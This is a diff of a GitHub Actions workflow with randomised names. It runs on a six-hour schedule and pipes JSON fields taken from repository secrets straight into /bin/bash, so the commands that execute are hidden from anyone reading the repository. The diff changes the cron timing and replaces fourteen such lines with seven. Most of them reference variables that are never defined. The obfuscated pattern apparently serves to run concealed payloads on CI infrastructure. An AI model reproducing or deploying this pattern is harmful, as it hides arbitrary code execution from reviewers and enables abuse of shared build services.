@@ -3,28 +3,23 @@ name: worthlessdrowned
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 2/6 * * *'
+    - cron: '30 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: worthlessdrowned
         env:
-          kpf09036: ${{ secrets.kpf09036 }}
+          b95903: ${{ secrets.b95903 }}
         run: |
-          echo $kpf09036 | jq -r .xo69271 | /bin/bash
-          echo $kdxzv6 | jq -r .tz66351 | /bin/bash
-          echo $p93 | jq -r .y75 | /bin/bash
-          echo $zok05414 | jq -r .ig5 | /bin/bash
-          echo $l88177 | jq -r .nlui21548 | /bin/bash
-          echo $lpd917 | jq -r .ubgn9269 | /bin/bash
-          echo $sr03825 | jq -r .hab33 | /bin/bash
-          echo $niovl517 | jq -r .dqstk5 | /bin/bash
-          echo $mcdk330 | jq -r .ezhn9 | /bin/bash
-          echo $y41270 | jq -r .ybyd2874 | /bin/bash
-          echo $jf53417 | jq -r .avwf8 | /bin/bash
-          echo $mvk6023 | jq -r .qu248 | /bin/bash
-          echo $ypzih93 | jq -r .n1 | /bin/bash
-          echo $zdojc977 | jq -r .l8094 | /bin/bash
+          echo $b95903 | jq -r .wl89417 | /bin/bash
+          echo $m73 | jq -r .u680 | /bin/bash
+          echo $tq345 | jq -r .wotw78 | /bin/bash
+          echo $glnz66442 | jq -r .o33461 | /bin/bash
+          echo $k2 | jq -r .ji164 | /bin/bash
+          echo $o60748 | jq -r .drcy0 | /bin/bash
+          echo $opxw5 | jq -r .nej43 | /bin/bash
 
